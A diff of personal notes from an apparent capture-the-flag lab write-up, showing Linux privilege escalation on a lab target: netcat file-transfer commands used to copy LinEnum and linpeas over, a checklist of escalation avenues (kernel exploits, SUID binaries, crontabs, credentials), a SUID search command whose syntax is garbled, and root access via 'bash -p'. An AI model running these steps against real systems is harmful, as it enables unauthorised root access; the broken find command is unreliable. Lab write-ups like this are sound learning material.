@@ -370,34 +370,33 @@ target_ip : 10.10.206.228
 
 **Action 2 - doing unnecessary things**
 
- 	copied LinEnum.sh, linpeas.sh to /tmp.  using :
- 	- for receiver `nc -l -p 4444 > expected_file`
+ copied LinEnum.sh, linpeas.sh to /tmp.  using :
+	- for receiver `nc -l -p 4444 > expected_file`
  	- for sender `nc -w 3 <receiver_ip> 4444 < expected_file`
 
  	and set as a executable
 
 **Action 3 - doing unnecessary things**
+What I should have done after running LinEnum or linpeas:(which i think is not nessary for this room)
 
- 	What I should have done after running LinEnum or linpeas:(which i think is not nessary for this room)
+   - Determining the kernel of the machine (kernel exploitation such as Dirtyc0w) 
 
- 	- Determining the kernel of the machine (kernel exploitation such as Dirtyc0w) 
+   - Locating other services running or applications installed that may be abusable (SUID & out of date software)
 
-    - Locating other services running or applications installed that may be abusable (SUID & out of date software)
+   - Looking for automated scripts like backup scripts (exploiting crontabs)
 
-    - Looking for automated scripts like backup scripts (exploiting crontabs)
+   - Credentials (user accounts, application config files..)
 
-    - Credentials (user accounts, application config files..)
-
-    - Mis-configured file and directory permissions
+   - Mis-configured file and directory permissions
 
 
 **Action 4 - find commands with SUID set**
- 	`find / 	- sudoers-perm -u=s -type f 2>/dev/null` logged it in suid_set.txt
- 	Found bunch of commands in it but `bash` is enough
+ `find / 	- sudoers-perm -u=s -type f 2>/dev/null` logged it in suid_set.txt
+ Found bunch of commands in it but `bash` is enough
 
 
 **Action 5 - [GTFObins](https://gtfobins.github.io/)**
- 	found suid exploit for bash: `bash -p` and got root access
+ found suid exploit for bash: `bash -p` and got root access
 
 
 ## Challenges Ans
